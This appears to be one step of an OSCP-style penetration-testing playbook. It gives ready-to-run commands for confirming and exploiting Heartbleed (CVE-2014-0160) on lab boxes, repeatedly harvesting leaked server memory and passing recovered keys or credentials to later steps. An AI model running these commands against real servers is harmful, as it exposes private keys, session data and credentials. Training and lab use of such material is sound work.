# Linux - Heartbleed Memory Disclosure

**Step 10A of 50 · Linux/Web/TLS**

*Confirm CVE-2014-0160, capture the leaked TLS heartbeat response, and route useful memory to private credential analysis.*

## Run this

> **Why:** Nmap's NSE check is a quick vulnerability confirmation; the reviewed Exploit-DB client then sends the malformed heartbeat that proves whether the server returns memory beyond the supplied payload.

```bash
sudo nmap -Pn -n -p $SSLPort --script ssl-heartbleed \
  -oA $BoxDir/nmap/ssl-heartbleed $BoxIP

searchsploit -x 32764
searchsploit -m 32764
mv 32764.py $BoxDir/exploits/heartbleed-32764.py

python2 $BoxDir/exploits/heartbleed-32764.py $BoxIP -p $SSLPort \
  > $BoxDir/loot/heartbleed-output.txt
```

## What to inspect

Look for a TLS record of type 24, a response longer than the three-byte
heartbeat payload, and the client's warning that the server returned more data
than it should. Save the raw output because the returned memory varies between
connections.

```bash
grep -nE 'type = 24|length =|WARNING|Received heartbeat' \
  $BoxDir/loot/heartbleed-output.txt
```

## Repeat only when required

Heap contents are nondeterministic. If the first response does not contain the
needed application clue, prime a known endpoint with a harmless marker held in
private shell state and collect a bounded number of additional responses.

```bash
# Keep $KeyHint private. Never use a real flag or unrelated credential as a marker.
curl -sk https://$BoxIP/decode.php \
  --data-urlencode "text=$KeyHint" > /dev/null

for i in $(seq 1 20); do
  python2 $BoxDir/exploits/heartbleed-32764.py $BoxIP -p $SSLPort \
    2>/dev/null >> $BoxDir/loot/heartbleed-loop.txt
done

strings -a -n 8 $BoxDir/loot/heartbleed-loop.txt | grep -v '^0x'
```

> [!warning] 💡
> The original client may stop after the first heartbeat record. That is enough
> to confirm the bug, but repeated captures are needed when useful data is in a
> later response or when the heap layout changes between connections.

## What did you get?

- [ ] Nmap reports vulnerable and the manual client returns excess data → **Save the response in private loot, inspect printable strings, then go to Step 17 · [[Linux - Credential Search]]**
- [ ] Nmap reports vulnerable but no useful clue appears → **Repeat a bounded number of times, check the request path and SNI, then return to Step 5 · [[Linux - Web Enum]] if the application cannot be primed**
- [ ] An alert or three-byte response is returned → **Treat the server as patched or incompatible with this client and do not claim useful disclosure**
- [ ] The response contains a key or credential → **Store it with the relevant loot helper, validate it once through the identified service, and continue local enumeration**

## Gotchas

> [!warning] 💡
> Heartbleed is a memory disclosure, not a password cracker. Do not assume the
> first response contains a session cookie or passphrase. Save all responses,
> filter locally, and treat every returned byte as sensitive.

> [!tip] 🛠️ Alternative tool
> `openssl s_client -connect $BoxIP:$SSLPort -servername $FQDN -brief` is useful for certificate and protocol troubleshooting, but it is not a Heartbleed exploit. Use Nmap NSE or a reviewed Heartbleed-aware client for the vulnerability check.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- Nmap confirmation and manual CVE-2014-0160 memory disclosure recovered the missing SSH-key context

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]
- [[Linux - Credential Search]]

## External Resources

- [CVE-2014-0160, MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)
- [Exploit-DB 32764](https://www.exploit-db.com/exploits/32764)
- [OpenSSL Heartbleed advisory](https://www.openssl.org/news/secadv/20140407.txt)

